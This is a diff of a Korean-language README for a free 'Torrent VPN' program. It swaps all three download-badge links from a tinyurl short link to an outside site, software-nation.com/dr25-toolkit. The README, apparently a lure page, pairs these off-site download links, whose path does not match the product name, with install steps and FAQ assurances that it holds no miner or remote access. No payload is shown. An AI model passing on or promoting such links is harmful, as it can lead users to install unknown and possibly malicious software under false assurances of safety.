@@ -9,7 +9,7 @@
 
 <div align="center">
 
-[![Download 토렌트 VPN](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/dr25-toolkit)
+[![Download 토렌트 VPN](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/dr25-toolkit)
 
 </div>
 
@@ -93,7 +93,7 @@
 5. **🚀 토렌트 VPN 실행** — 바탕화면 바로가기 클릭
 6. **⚡ "연결" 버튼 클릭** — 보호 시작
 
-[![Download 토렌트 VPN](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/dr25-toolkit)
+[![Download 토렌트 VPN](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/dr25-toolkit)
 
 ### 자세한 사용법
 
@@ -184,7 +184,7 @@ A: 네. 결제, 암호화폐 채굴기, 원격 접속이 없습니다.
 
 <div align="center">
 
-[![Download 토렌트 VPN](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/dr25-toolkit)
+[![Download 토렌트 VPN](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/dr25-toolkit)
 
 **버전 5.2.0** — 안전한 P2P 다운로드. 영원히 무료.
 
